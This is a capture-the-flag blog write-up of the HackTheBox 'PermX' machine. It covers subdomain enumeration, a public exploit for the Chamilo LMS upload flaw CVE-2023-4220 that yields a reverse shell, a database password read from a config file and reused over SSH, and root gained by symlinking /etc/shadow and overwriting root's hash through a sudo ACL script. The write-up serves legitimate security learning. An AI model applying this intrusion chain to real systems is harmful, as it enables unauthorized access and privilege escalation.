---
title: 'HackTheBox: PermX'
date: 2024-10-04 14:18:00
author: w0rmhol3
categories: Write-Up
tags: CTF
cover: https://github.com/w0rmhol3/w0rmhol3-Blog/blob/main/source/_img/HackTheBox/PermX/Cover.png?raw=true
---
So, I haven’t been playing HTB for quite sometime, and I finally had some motivation (or mood) to try out some boxes. So here is my writeup for the `HTB seasonal machine: PermX`.<!--more-->

![PermX Box](https://github.com/w0rmhol3/w0rmhol3-Blog/blob/main/source/_img/HackTheBox/PermX/PermX_Box.png?raw=true)

So, starting off, lets run nmap to look for the open ports.
```sh
┌──(w0rmhol3㉿QuackMachine2)-[~/Documents/CTF/HTB/Permx]
└─$ nmap -sC -sV -Pn 10.10.11.23 -o nmap-scan.nmap
Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-11 09:24 EDT
Nmap scan report for 10.10.11.23
Host is up (0.28s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://permx.htb
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Directly we can see only 2 ports open (SSH and HTTP), so lets start going through the web to see what we can find.

![webpage](https://github.com/w0rmhol3/w0rmhol3-Blog/blob/main/source/_img/HackTheBox/PermX/webpage.png?raw=true)

in short, this is some sort of an e-learning platform, nothing special from here, but this web took me quite some time to look around, fuzzing everything i can. and in the end, i decided maybe subdomain is worth to have a look as i don’t think there’s anything worth looking into from here. 

Using ffuf to enumerate it, i was able to found an interesting subdomain.

```sh
┌──(w0rmhol3㉿QuackMachine2)-[~/Documents/CTF/HTB/Permx]
└─$ ffuf -w /usr/share/wordlists/Discovery/DNS/subdomains-top1million-5000.txt -u http://permx.htb -H "Host: FUZZ.permx.htb" -fw 18

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/SL/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.permx.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 18
________________________________________________

www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 308ms]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 341ms]
:: Progress: [4989/4989] :: Job [1/1] :: 123 req/sec :: Duration: [0:00:38] :: Errors: 0 ::
```
`the ‘-fw 18’ is use to filter out the response size 18, as they are the ones that are invalid.`

As shown, the subdomain“lms.permx.htb” was found.

![chamilo](https://github.com/w0rmhol3/w0rmhol3-Blog/blob/main/source/_img/HackTheBox/PermX/webpage2.png?raw=true)

 When i saw this page, instantly i went to google and look for existing CVE, in which i had found CVE-2023-4220: Chamilo LMS Unauthenticated Big Upload File Remote Code Execution. This vulnerability allows an unauthenticated attacker to perform stored cross-site scripting attacks and obtain remote code execution via uploading of web shell.

 I found an [exploit script](https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc) from github that can automate this attack to gain reverse shell directly.

 So, using the script and running netcat, i was able to gain a reverse shell.

 ```sh
┌──(w0rmhol3㉿QuackMachine2)-[~/Documents/CTF/HTB/Permx]
└─$ nc -lvnp 4444             
listening on [any] 4444 ...
connect to [10.10.14.48] from (UNKNOWN) [10.10.11.23] 34572
bash: cannot set terminal process group (1169): Inappropriate ioctl for device
bash: no job control in this shell
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ 
 ```

And this is another part where I am stuck at, as this initial foothold does not comes with the user flag, I wrap my head around trying to figure out how to get to the user. So, what was needed to be done is to find a way to get mtz user account to get user.txt, then privilege escalate to root. It took me some time to figure out next is to find the config file.

```sh
www-data@permx:/var/www/chamilo/app/config$ cat configuration.php
[snip]
// Database connection settings.
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
// Enable access to database management for platform admins.
$_configuration['db_manager_enabled'] = false;
[snip]
```

After taking my time enumerating the server, i found the configuration file that had led me to a credential.

So, I believe that the intentional method was to go through the sql database, and exploit from there, but when I found this credential, I instantly went and try to ssh into mtz account.

```sh
┌──(w0rmhol3㉿QuackMachine2)-[~/Documents/CTF/HTB/Permx]
└─$ ssh mtz@10.10.11.23                      
The authenticity of host '10.10.11.23 (10.10.11.23)' can't be established.
ED25519 key fingerprint is SHA256:u9/wL+62dkDBqxAG3NyMhz/2FTBJlmVC1Y1bwaNLqGA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.23' (ED25519) to the list of known hosts.
mtz@10.10.11.23's password: 

Last login: Thu Jul 11 13:32:46 2024 from 10.10.16.50
mtz@permx:~$ 
```

WALLA, mtz account. So from here just read the user.txt to get the user flag.

```sh
mtz@permx:~$ cat user.txt 
[flag]
```

So user✅ all left is the privilege escalation.

```sh
mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh

```

when trying to see what mtz is able of executing i found this /opt/acl.sh file.

```bash
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```
This file is not writeable, and can only be executed, so from the looks of it, executing this file is the only way to get root. So from my own understanding, I can see that it can mess with the file’s ACL, but I did utilized chatgpt to help me correctly use this function 

The explanation of this code is that, the [acl.sh](http://acl.sh) file will be able to change the file permission, that are within /home/mtz directory. 

This brings me the thought of changing the root credentials to mtz credentials by allowing modification on the /etc/shadow file. But to do so, an extra step of creating a symlink of /etc/shadow file in the user directory to change the file permission.

```sh
mtz@permx:~$ ln -s /etc/shadow ./
mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/shadow
mtz@permx:~$ nano shadow
```

Then all i need to do is go and modify root credentials within the shadow file.

```sh
root:$y$j9T$RUjBgvOODKC9hyu5u7zCt0$Vf7nqZ4umh3s1N69EeoQ4N5zoid6c2SlGb1LvBFRxSB:19742:0:9999>
daemon:*:19579:0:99999:7:::
bin:*:19579:0:99999:7:::
sys:*:19579:0:99999:7:::
sync:*:19579:0:99999:7:::
games:*:19579:0:99999:7:::
man:*:19579:0:99999:7:::
lp:*:19579:0:99999:7:::
mail:*:19579:0:99999:7:::
news:*:19579:0:99999:7:::
uucp:*:19579:0:99999:7:::
proxy:*:19579:0:99999:7:::
www-data:*:19579:0:99999:7:::
backup:*:19579:0:99999:7:::
list:*:19579:0:99999:7:::
irc:*:19579:0:99999:7:::
gnats:*:19579:0:99999:7:::
nobody:*:19579:0:99999:7:::
_apt:*:19579:0:99999:7:::
systemd-network:*:19579:0:99999:7:::
systemd-resolve:*:19579:0:99999:7:::
messagebus:*:19579:0:99999:7:::
systemd-timesync:*:19579:0:99999:7:::
pollinate:*:19579:0:99999:7:::
sshd:*:19579:0:99999:7:::
syslog:*:19579:0:99999:7:::
uuidd:*:19579:0:99999:7:::
tcpdump:*:19579:0:99999:7:::
tss:*:19579:0:99999:7:::
landscape:*:19579:0:99999:7:::
fwupd-refresh:*:19579:0:99999:7:::
usbmux:*:19742:0:99999:7:::
mtz:$y$j9T$RUjBgvOODKC9hyu5u7zCt0$Vf7nqZ4umh3s1N69EeoQ4N5zoid6c2SlGb1LvBFRxSB:19742:0:99999>
lxd:!:19742::::::
mysql:!:19742:0:99999:7:::
```

As you can see, i modified the root password hash to be as same as mtz’s hash, hence it replaces the password to get the root access in the system. All i need to do now, is become root.

```sh
mtz@permx:~$ su
Password: 
root@permx:
```

THERE, ROOT.

```sh
root@permx:/home/mtz# cat /root/root.txt
[flag]
```

user✅root✅Permx✅